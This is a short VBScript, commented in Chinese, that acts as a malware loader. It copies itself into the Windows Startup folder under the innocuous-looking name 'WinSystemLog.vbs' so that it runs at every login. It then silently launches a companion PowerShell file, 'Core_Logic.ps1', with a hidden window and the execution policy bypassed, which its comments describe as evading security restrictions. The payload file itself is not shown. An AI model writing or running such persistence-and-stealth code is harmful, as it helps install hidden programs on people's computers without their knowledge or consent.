' --- 初始化对象 ---
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- 获取当前路径 ---
currentDir = fso.GetParentFolderName(WScript.ScriptFullName)
psPath = currentDir & "\Core_Logic.ps1" ' 核心逻辑文件路径

' --- 1. 实现持久化 (自启) ---
' 模拟把脚本复制到 Windows 启动文件夹
startupFolder = WshShell.SpecialFolders("Startup")
destFile = startupFolder & "\WinSystemLog.vbs"

If Not fso.FileExists(destFile) Then
    fso.CopyFile WScript.ScriptFullName, destFile, True
End If

' --- 2. 静默启动 PowerShell 核心负载 ---
' -WindowStyle Hidden 确保不会弹出黑窗口
' -ExecutionPolicy Bypass 确保脚本能绕过系统的安全限制运行
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, False
